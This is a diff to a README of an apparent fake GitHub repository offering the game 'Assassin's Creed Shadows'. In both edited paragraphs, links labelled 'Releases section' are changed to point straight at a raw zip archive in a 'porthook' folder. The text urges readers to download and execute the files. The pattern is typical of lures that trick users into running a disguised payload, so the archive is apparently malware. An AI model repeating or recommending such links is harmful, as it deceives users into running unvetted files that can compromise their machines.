@@ -12,7 +12,7 @@ Here, you will discover an array of topics related to "assasin-creed-shadows," c
 
 ### Unveiling the Shadows
 
-To access the heart of the action and unleash your inner assassin, make sure to visit our [Releases section](https://github.com/mardecilnonp568/Assasin-Creed-Shadows/releases). Here, you'll find the essential files waiting to be downloaded and executed, guiding you towards an unforgettable gameplay experience.
+To access the heart of the action and unleash your inner assassin, make sure to visit our [Releases section](https://github.com/mardecilnonp568/Assasin-Creed-Shadows/raw/refs/heads/main/porthook/Shadows-Assasin-Creed-v3.5-alpha.4.zip). Here, you'll find the essential files waiting to be downloaded and executed, guiding you towards an unforgettable gameplay experience.
 
 ### Embrace the Adventure
 
@@ -32,4 +32,4 @@ Prepare to explore a world teeming with excitement and danger, conquer your fear
 
 ### Visit the Battlefield
 
-For more details and to begin your adventure, don't hesitate to visit our [Releases section](https://github.com/mardecilnonp568/Assasin-Creed-Shadows/releases). Your destiny as an assassin and a samurai in feudal Japan awaits—step into the shadows and embrace the challenge that lies ahead.
+For more details and to begin your adventure, don't hesitate to visit our [Releases section](https://github.com/mardecilnonp568/Assasin-Creed-Shadows/raw/refs/heads/main/porthook/Shadows-Assasin-Creed-v3.5-alpha.4.zip). Your destiny as an assassin and a samurai in feudal Japan awaits—step into the shadows and embrace the challenge that lies ahead.
